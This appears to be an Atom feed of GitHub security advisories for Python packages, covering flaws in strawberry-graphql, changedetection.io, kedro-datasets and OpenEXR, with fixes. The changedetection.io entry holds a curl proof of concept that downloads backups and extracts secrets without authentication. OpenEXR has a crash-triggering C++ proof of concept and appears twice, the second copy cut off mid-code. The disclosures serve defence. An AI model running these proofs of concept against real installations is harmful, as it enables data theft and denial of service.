<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-04-06T18:14:27.374Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[strawberry-graphql] strawberry-graphql: Denial of Service via unbounded WebSocket subscriptions]]></title>
        <id>https://github.com/advisories/GHSA-hv3w-m4g2-5x77</id>
        <link href="https://github.com/advisories/GHSA-hv3w-m4g2-5x77"/>
        <updated>2026-04-06T18:00:30.000Z</updated>
        <content type="html"><![CDATA[<p>Strawberry GraphQL's WebSocket subscription handlers for both the <code>graphql-transport-ws</code> and legacy <code>graphql-ws</code> protocols allocate an <code>asyncio.Task</code> and associated <code>Operation</code> object for every incoming subscribe message without enforcing any limit on the number of active subscriptions per connection.</p>
<p>An unauthenticated attacker can open a single WebSocket connection, send connection_init, and then flood subscribe messages with unique IDs. Each message unconditionally spawns a new <code>asyncio.Task</code> and async generator, causing linear memory growth and event loop saturation. This leads to server degradation or an OOM crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-hv3w-m4g2-5x77">https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-hv3w-m4g2-5x77</a></li>
<li><a href="https://github.com/strawberry-graphql/strawberry/commit/0977a4e6b41b7cfe3e9d8ba84a43458a2b0c54c2">https://github.com/strawberry-graphql/strawberry/commit/0977a4e6b41b7cfe3e9d8ba84a43458a2b0c54c2</a></li>
<li><a href="https://github.com/strawberry-graphql/strawberry/releases/tag/0.312.3">https://github.com/strawberry-graphql/strawberry/releases/tag/0.312.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hv3w-m4g2-5x77">https://github.com/advisories/GHSA-hv3w-m4g2-5x77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hv3w-m4g2-5x77</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-06T18:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[strawberry-graphql] strawberry-graphql: Authentication bypass via legacy graphql-ws WebSocket subprotocol]]></title>
        <id>https://github.com/advisories/GHSA-vpwc-v33q-mq89</id>
        <link href="https://github.com/advisories/GHSA-vpwc-v33q-mq89"/>
        <updated>2026-04-06T18:00:27.000Z</updated>
        <content type="html"><![CDATA[<p>Strawberry up until version <code>0.312.3</code> is vulnerable to an authentication bypass on WebSocket subscription endpoints. The legacy graphql-ws subprotocol handler does not verify that a <code>connection_init</code> handshake has been completed before processing start (subscription) messages. This allows a remote attacker to skip the <code>on_ws_connect</code> authentication hook entirely by connecting with the graphql-ws subprotocol and sending a start message directly, without ever sending <code>connection_init</code>.</p>
<p>The graphql-transport-ws subprotocol handler is not affected, as it correctly gates subscription operations on a connection_acknowledged flag. However, both subprotocols are enabled by default in all framework integrations that support websockets, and the subprotocol is selected by the client via the Sec-WebSocket-Protocol header.</p>
<p>Any application relying on <code>on_ws_connect</code> for authentication or authorization is affected.</p>
<p>Mitigation: Upgrade to the patched version, or explicitly disable the legacy graphql-ws subprotocol by setting <code>subscription_protocols=[GRAPHQL_TRANSPORT_WS_PROTOCOL]</code> on your GraphQL view/router.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-vpwc-v33q-mq89">https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-vpwc-v33q-mq89</a></li>
<li><a href="https://github.com/strawberry-graphql/strawberry/commit/0977a4e6b41b7cfe3e9d8ba84a43458a2b0c54c2">https://github.com/strawberry-graphql/strawberry/commit/0977a4e6b41b7cfe3e9d8ba84a43458a2b0c54c2</a></li>
<li><a href="https://github.com/strawberry-graphql/strawberry/releases/tag/0.312.3">https://github.com/strawberry-graphql/strawberry/releases/tag/0.312.3</a></li>
<li><a href="https://github.com/advisories/GHSA-vpwc-v33q-mq89">https://github.com/advisories/GHSA-vpwc-v33q-mq89</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpwc-v33q-mq89</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-06T18:00:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] changedetection.io Vulnerable to Authentication Bypass via Decorator Ordering]]></title>
        <id>https://github.com/advisories/GHSA-jmrh-xmgh-x9j4</id>
        <link href="https://github.com/advisories/GHSA-jmrh-xmgh-x9j4"/>
        <updated>2026-04-06T18:00:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>On 13 routes across 5 blueprint files, the <code>@login_optionally_required</code> decorator is placed <strong>before</strong> (outer to) <code>@blueprint.route()</code> instead of after it. In Flask, <code>@route()</code> must be the outermost decorator because it registers the function it receives. When the order is reversed, <code>@route()</code> registers the <strong>original undecorated function</strong>, and the auth wrapper is never in the call chain. This silently disables authentication on these routes.</p>
<p>The developer correctly uses the decorator on 30+ other routes with the proper order, making this a classic consistency gap.</p>
<h3 id="details">Details</h3>
<p><strong>Correct order (used on 30+ routes):</strong></p>
<pre><code class="language-python">@blueprint.route('/settings', methods=['GET'])
@login_optionally_required
def settings():
    ...
</code></pre>
<p><strong>Incorrect order (13 vulnerable routes):</strong></p>
<pre><code class="language-python">@login_optionally_required          # ← Applied to return value of @route, NOT the view
@blueprint.route('/backups/download/&lt;filename&gt;')  # ← Registers raw function
def download_backup(filename):
    ...
</code></pre>
<h2 id="poc">POC</h2>
<pre><code>=== PHASE 1: Confirm Authentication is Required ===

$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/
Main page:     HTTP 302 -&gt; http://127.0.0.1:5557/login?next=/
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/settings
Settings page: HTTP 302 (auth required, redirects to login)

Password is set. Unauthenticated requests to / and /settings
are properly redirected to /login.

=== PHASE 2: Authentication Bypass on Backup Routes ===
(All requests made WITHOUT any session cookie)

--- Exploit 1: Trigger backup creation ---
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/backups/request-backup
Response: HTTP 302 -&gt; http://127.0.0.1:5557/backups/
(302 redirects to /backups/ listing page, NOT to /login -- backup was created)

--- Exploit 2: List backups page ---
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/backups/
Response: HTTP 200

--- Exploit 3: Extract backup filenames ---
$ curl -s http://127.0.0.1:5557/backups/ | grep changedetection-backup
Found: changedetection-backup-20260331005425.zip

--- Exploit 4: Download backup without authentication ---
$ curl -s -o /tmp/stolen_backup.zip http://127.0.0.1:5557/backups/download/changedetection-backup-20260331005425.zip
Response: HTTP 200

$ file /tmp/stolen_backup.zip
/tmp/stolen_backup.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

$ ls -la /tmp/stolen_backup.zip
-rw-r--r-- 1 root root 92559 Mar 31 00:54 /tmp/stolen_backup.zip

$ unzip -l /tmp/stolen_backup.zip
Archive:  /tmp/stolen_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    26496  2026-03-31 00:54   url-watches.json
       64  2026-03-31 00:52   secret.txt
       51  2026-03-31 00:52   4ff247a9-0d8e-4308-8569-f6137fa76e0d/history.txt
     1682  2026-03-31 00:52   4ff247a9-0d8e-4308-8569-f6137fa76e0d/4b7f61d9f981b92103a6659f0d79a93e.txt.br
     4395  2026-03-31 00:52   4ff247a9-0d8e-4308-8569-f6137fa76e0d/1774911131.html.br
    40877  2026-03-31 00:52   c8d85001-19d1-47a1-a8dc-f45876789215/6b3a3023b357a0ea25fc373c7e358ce2.txt.br
       51  2026-03-31 00:52   c8d85001-19d1-47a1-a8dc-f45876789215/history.txt
    40877  2026-03-31 00:52   c8d85001-19d1-47a1-a8dc-f45876789215/1774911131.html.br
       73  2026-03-31 00:54   url-list.txt
      155  2026-03-31 00:54   url-list-with-tags.txt
---------                     -------
   114721                     10 files

--- Exploit 5: Extract sensitive data from backup ---
Application password hash: pG+Bq6s4/EhsRqYZYc7kiGEG1QMd2hMuadD5qCMbSBcRIMnGTATliX/P0vFX...
Watched URLs:
  - https://news.ycombinator.com/  (UUID: 4ff247a9...)
  - https://changedetection.io/CHANGELOG.txt  (UUID: c8d85001...)

Flask secret key: 7cb14f56dc4f26761a22e7d35cc7b6911bfaa5e0790d2b58dadba9e529e5a4d6

--- Exploit 6: Delete all backups without auth ---
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5557/backups/remove-backups
Response: HTTP 302

=== PHASE 3: Cross-Verification ===

Verify protected routes still require auth:
  /         -&gt; HTTP 302 (302 = protected)
  /settings -&gt; HTTP 302 (302 = protected)

=== RESULTS ===

PROTECTED routes (auth required, HTTP 302 -&gt; /login):
  /              HTTP 302
  /settings      HTTP 302

BYPASSED routes (no auth needed):
  /backups/request-backup  HTTP 302 (triggers backup creation, redirects to /backups/ not /login)
  /backups/                HTTP 200 (lists all backups)
  /backups/download/&lt;file&gt; HTTP 200 (downloads backup with secrets)
  /backups/remove-backups  HTTP 302 (deletes all backups)

[+] CONFIRMED: Authentication bypass on backup routes!
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Complete data exfiltration</strong> — Backups contain all monitored URLs, notification webhook URLs (which may contain API tokens for Slack, Discord, etc.), and configuration</li>
<li><strong>Backup restore = config injection</strong> — Attacker can upload a malicious backup with crafted watch configs</li>
<li><strong>SSRF</strong> — Proxy check endpoint can be triggered to scan internal network</li>
<li><strong>Browser session hijacking</strong> — Browser steps endpoints allow controlling Playwright sessions</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>Swap the decorator order on all 13 routes. <code>@blueprint.route()</code> must be outermost:</p>
<pre><code class="language-python"># Before (VULNERABLE):
@login_optionally_required
@blueprint.route('/backups/download/&lt;filename&gt;')
def download_backup(filename):

# After (FIXED):
@blueprint.route('/backups/download/&lt;filename&gt;')
@login_optionally_required
def download_backup(filename):
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-jmrh-xmgh-x9j4">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-jmrh-xmgh-x9j4</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/31a760c2147e3e73a403baf6d7de34dc50429c85">https://github.com/dgtlmoon/changedetection.io/commit/31a760c2147e3e73a403baf6d7de34dc50429c85</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.8">https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.8</a></li>
<li><a href="https://github.com/advisories/GHSA-jmrh-xmgh-x9j4">https://github.com/advisories/GHSA-jmrh-xmgh-x9j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmrh-xmgh-x9j4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-06T18:00:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kedro-datasets] kedro-datasets has a path traversal vulnerability in PartitionedDataset that allows arbitrary file write]]></title>
        <id>https://github.com/advisories/GHSA-cjg8-h5qc-hrjv</id>
        <link href="https://github.com/advisories/GHSA-cjg8-h5qc-hrjv"/>
        <updated>2026-04-06T17:55:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>PartitionedDataset in kedro-datasets was vulnerable to path traversal. Partition IDs were concatenated directly with the dataset base path without validation. An attacker or malicious input containing .. components in a partition ID could cause files to be written outside the configured dataset directory, potentially overwriting arbitrary files on the filesystem.
Users of PartitionedDataset with any storage backend (local filesystem, S3, GCS, etc.) are affected.</p>
<h3 id="patches">Patches</h3>
<p>Yes. The vulnerability has been patched in kedro-datasets version 9.3.0.
Users should upgrade to kedro-datasets &gt;= 9.3.0. The fix normalizes constructed paths using <code>posixpath.normpath</code> and validates that the resolved path remains within the dataset base directory before use, raising a <code>DatasetError</code> if the path escapes the base directory.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users who cannot upgrade should validate partition IDs before passing them to PartitionedDataset, ensuring they do not contain <code>..</code> path components.</p>
<h3 id="references">References</h3>
<p>Fix: <a href="https://github.com/kedro-org/kedro-plugins/pull/1346">https://github.com/kedro-org/kedro-plugins/pull/1346</a>
Report: <a href="https://github.com/kedro-org/kedro/issues/5452">https://github.com/kedro-org/kedro/issues/5452</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kedro-org/kedro-plugins/security/advisories/GHSA-cjg8-h5qc-hrjv">https://github.com/kedro-org/kedro-plugins/security/advisories/GHSA-cjg8-h5qc-hrjv</a></li>
<li><a href="https://github.com/kedro-org/kedro/issues/5452">https://github.com/kedro-org/kedro/issues/5452</a></li>
<li><a href="https://github.com/kedro-org/kedro-plugins/pull/1346">https://github.com/kedro-org/kedro-plugins/pull/1346</a></li>
<li><a href="https://github.com/kedro-org/kedro-plugins/commit/65115f76b872217317734b6bde8927170c98fc4b">https://github.com/kedro-org/kedro-plugins/commit/65115f76b872217317734b6bde8927170c98fc4b</a></li>
<li><a href="https://github.com/kedro-org/kedro-plugins/releases/tag/kedro-datasets-9.3.0">https://github.com/kedro-org/kedro-plugins/releases/tag/kedro-datasets-9.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cjg8-h5qc-hrjv">https://github.com/advisories/GHSA-cjg8-h5qc-hrjv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjg8-h5qc-hrjv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:55:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has heap-buffer-overflow via signed integer underflow in ImfContextInit.cpp]]></title>
        <id>https://github.com/advisories/GHSA-q6vj-wxvf-5m8c</id>
        <link href="https://github.com/advisories/GHSA-q6vj-wxvf-5m8c"/>
        <updated>2026-04-06T17:51:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A heap-buffer-overflow (OOB read) occurs in the <code>istream_nonparallel_read</code> function in <code>ImfContextInit.cpp</code> when parsing a malformed EXR file through a memory-mapped <code>IStream</code>. A signed integer subtraction produces a negative value that is implicitly converted to <code>size_t</code>, resulting in a massive length being passed to <code>memcpy</code>.</p>
<h2 id="affected-version">Affected Version</h2>
<ul>
<li>OpenEXR <strong>main branch</strong> (commit at time of testing)</li>
<li><code>src/lib/OpenEXR/ImfContextInit.cpp</code>, lines 121–136</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p><code>ImfContextInit.cpp:121-126</code>:</p>
<pre><code class="language-cpp">int64_t stream_sz = s-&gt;size ();           // e.g., 21 (actual file size)
int64_t nend = nread + (int64_t)sz;       // e.g., 17 + 4096 = 4113
if (stream_sz &gt; 0 &amp;&amp; nend &gt; stream_sz)
{
    sz = stream_sz - nend;                // 21 - 4113 = -4092 (signed)
}
// ...
memcpy (buffer, data, sz);               // sz is size_t → wraps to 0xFFFFFFFFFFFFF004
</code></pre>
<p><code>sz</code> is of type <code>size_t</code> (unsigned), but <code>stream_sz - nend</code> yields a negative <code>int64_t</code> value. This negative value is implicitly converted to <code>size_t</code>, wrapping around to a value close to <code>2^64</code>, which is then passed to <code>memcpy</code> causing a heap-buffer-overflow.</p>
<p><strong>Suggested fix:</strong> <code>sz = stream_sz - nend</code> → <code>sz = stream_sz - nread</code></p>
<h2 id="reproduce">Reproduce</h2>
<p>Build OpenEXR as static libraries with ASAN enabled, then compile the PoC below.</p>
<p><strong>PoC Code:</strong></p>
<pre><code class="language-cpp">#include &lt;cstdint&gt;
#include &lt;cstring&gt;
#include &lt;iostream&gt;

#include &lt;ImfMultiPartInputFile.h&gt;
#include &lt;ImfInputPart.h&gt;
#include &lt;ImfHeader.h&gt;

OPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_ENTER

class MemMapIStream : public IStream
{
public:
    MemMapIStream (const uint8_t* data, size_t len)
        : IStream ("poc_input")
        , _data (reinterpret_cast&lt;const char*&gt; (data))
        , _size (static_cast&lt;int64_t&gt; (len))
        , _pos (0)
    {}

    bool isMemoryMapped () const override { return true; }

    bool read (char c[], int n) override
    {
        int64_t avail = (_pos &lt; _size) ? (_size - _pos) : 0;
        int64_t copy  = (static_cast&lt;int64_t&gt; (n) &lt; avail) ? n : avail;
        if (copy &gt; 0) memcpy (c, _data + _pos, copy);
        _pos += n;
        return _pos &lt;= _size;
    }

    char* readMemoryMapped (int n) override
    {
        if (_pos + n &gt; _size)
            throw IEX_NAMESPACE::InputExc ("read past end");
        const char* p = _data + _pos;
        _pos += n;
        return const_cast&lt;char*&gt; (p);
    }

    uint64_t tellg () override { return static_cast&lt;uint64_t&gt; (_pos); }
    void     seekg (uint64_t pos) override { _pos = static_cast&lt;int64_t&gt; (pos); }

    int64_t size () override { return _size; }

private:
    const char* _data;
    int64_t     _size;
    int64_t     _pos;
};

OPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_EXIT

int main ()
{
    static const uint8_t crash_data[] = {
        0x76, 0x2f, 0x31, 0x01,
        0x02, 0x06, 0x00, 0x00,
        0x74, 0x69, 0x6c, 0x65, 0x73, 0x00,
        0x20, 0x00, 0x00,
        0x53, 0x00, 0x00, 0x00
    };

    try
    {
        Imf::MemMapIStream stream (crash_data, sizeof (crash_data));
        Imf::MultiPartInputFile file (stream);
    }
    catch (const std::exception&amp; e)
    {
        std::cout &lt;&lt; "Exception: " &lt;&lt; e.what () &lt;&lt; "\n";
    }

    return 0;
}
</code></pre>
<p><strong>PoC Input:</strong> <a href="https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link">https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link</a></p>
<h2 id="asan-log">ASAN Log</h2>
<pre><code>==305348==ERROR: AddressSanitizer: negative-size-param: (size=-4096)
    #0 0x62aee9fc732a in __asan_memcpy (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #1 0x62aeea0e3377 in Imf_4_0::istream_nonparallel_read(_priv_exr_context_t const*, void*, void*, unsigned long, unsigned long, int (*)(_priv_exr_context_t const*, int, char const*, ...)) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContextInit.cpp:136:21
    #2 0x62aeea15e75b in dispatch_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:51:16
    #3 0x62aeea19da19 in scratch_seq_skip /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:202:29
    #4 0x62aeea197ec9 in check_populate_tiles /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:1560:9
    #5 0x62aeea197ec9 in check_req_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2020:24
    #6 0x62aeea197ec9 in pull_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2085:10
    #7 0x62aeea197ec9 in internal_exr_parse_header /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2848:18
    #8 0x62aeea15f578 in exr_start_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:270:49
    #9 0x62aeea0d8130 in Imf_4_0::Context::Context(char const*, Imf_4_0::ContextInitializer const&amp;, Imf_4_0::Context::read_mode_t) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContext.cpp:124:10
    #10 0x62aeea0633ab in Imf_4_0::MultiPartInputFile::MultiPartInputFile(char const*, Imf_4_0::ContextInitializer const&amp;, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:59:7
    #11 0x62aeea0649de in Imf_4_0::MultiPartInputFile::MultiPartInputFile(Imf_4_0::IStream&amp;, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:96:7
    #12 0x62aeea00d522 in fuzz_cpp_headers(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:167:31
    #13 0x62aeea00d522 in fuzz_cpp_api(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:460:5
    #14 0x62aeea00a156 in LLVMFuzzerTestOneInput /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:927:5
    #15 0x62aee9f15414 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187414) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #16 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #17 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #18 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #19 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #20 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #21 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)

0x503000000235 is located 0 bytes after 21-byte region [0x503000000220,0x503000000235)
allocated by thread T0 here:
    #0 0x62aeea007c61 in operator new[](unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x279c61) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #1 0x62aee9f15325 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187325) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #2 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #3 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #4 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #5 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #6 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #7 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)

SUMMARY: AddressSanitizer: negative-size-param (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0) in __asan_memcpy
==305348==ABORTING
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>DoS</strong> — Any application that opens a crafted EXR file will crash immediately</li>
<li><strong>CWE-195</strong> (Signed to Unsigned Conversion Error) → <strong>CWE-122</strong> (Heap-based Buffer Overflow)</li>
<li>Affects any application using an <code>IStream</code> implementation where <code>isMemoryMapped()</code> returns <code>true</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26981">https://nvd.nist.gov/vuln/detail/CVE-2026-26981</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef">https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8">https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8</a></li>
<li><a href="https://github.com/advisories/GHSA-q6vj-wxvf-5m8c">https://github.com/advisories/GHSA-q6vj-wxvf-5m8c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6vj-wxvf-5m8c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has heap-buffer-overflow via signed integer underflow in ImfContextInit.cpp]]></title>
        <id>https://github.com/advisories/GHSA-q6vj-wxvf-5m8c</id>
        <link href="https://github.com/advisories/GHSA-q6vj-wxvf-5m8c"/>
        <updated>2026-04-06T17:51:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A heap-buffer-overflow (OOB read) occurs in the <code>istream_nonparallel_read</code> function in <code>ImfContextInit.cpp</code> when parsing a malformed EXR file through a memory-mapped <code>IStream</code>. A signed integer subtraction produces a negative value that is implicitly converted to <code>size_t</code>, resulting in a massive length being passed to <code>memcpy</code>.</p>
<h2 id="affected-version">Affected Version</h2>
<ul>
<li>OpenEXR <strong>main branch</strong> (commit at time of testing)</li>
<li><code>src/lib/OpenEXR/ImfContextInit.cpp</code>, lines 121–136</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p><code>ImfContextInit.cpp:121-126</code>:</p>
<pre><code class="language-cpp">int64_t stream_sz = s-&gt;size ();           // e.g., 21 (actual file size)
int64_t nend = nread + (int64_t)sz;       // e.g., 17 + 4096 = 4113
if (stream_sz &gt; 0 &amp;&amp; nend &gt; stream_sz)
{
    sz = stream_sz - nend;                // 21 - 4113 = -4092 (signed)
}
// ...
memcpy (buffer, data, sz);               // sz is size_t → wraps to 0xFFFFFFFFFFFFF004
</code></pre>
<p><code>sz</code> is of type <code>size_t</code> (unsigned), but <code>stream_sz - nend</code> yields a negative <code>int64_t</code> value. This negative value is implicitly converted to <code>size_t</code>, wrapping around to a value close to <code>2^64</code>, which is then passed to <code>memcpy</code> causing a heap-buffer-overflow.</p>
<p><strong>Suggested fix:</strong> <code>sz = stream_sz - nend</code> → <code>sz = stream_sz - nread</code></p>
<h2 id="reproduce">Reproduce</h2>
<p>Build OpenEXR as static libraries with ASAN enabled, then compile the PoC below.</p>
<p><strong>PoC Code:</strong></p>
<pre><code class="language-cpp">#include &lt;cstdint&gt;
#include &lt;cstring&gt;
#include &lt;iostream&gt;

#include &lt;ImfMultiPartInputFile.h&gt;
#include &lt;ImfInputPart.h&gt;
#include &lt;ImfHeader.h&gt;

OPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_ENTER

class MemMapIStream : public IStream
{
public:
    MemMapIStream (const uint8_t* data, size_t len)
        : IStream ("poc_input")
        , _data (reinterpret_cast&lt;const char*&gt; (data))
        , _size (static_cast&lt;int64_t&gt; (len))
        , _pos (0)
    {}

    bool isMemoryMapped () const override { return true; }

    bool read (char c[], int n) override
    {
        int64_t avail = (_pos &lt; _size) ? (_size - _pos) : 0;
        int64_t copy  = (static_cast&lt;int64_t&gt; (n) &lt; avail) ? n : avail;
        if (copy &gt; 0) memcpy (c, _data + _pos, copy);
        _pos += n;
        return _pos &lt;= _size;
    }

    char* readMemoryMapped (int n) override
    {
        if (_pos + n &gt; _size)
            throw IEX_NAMESPACE::InputExc ("read past end");
        const char* p = _data + _pos;
        _pos += n;
        return const_cast&lt;char*&gt; (p);
    }

    uint64_t tellg () override { return static_cast&lt;uint64_t&gt; (_pos); }
    void     seekg (uint64_t pos) override { _pos = static_cast&lt;int64_t&gt; (pos); }

    int64_t size () override { return _size; }

private:
    const char* _data;
    int64_t     _size;
    int64_t     _pos;
};

OPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_EXIT

int main ()
{
    static const uint8_t crash_data[] = {
        0x76, 0x2f, 0x31, 0x01,
        0x02, 0x06, 0x00, 0x00,
        0x74, 0x69, 0x6c, 0x65, 0x73, 0x00,
        0x20, 0x00, 0x00,
        0x53, 0x00, 0x00, 0x00
    };

    try
    {
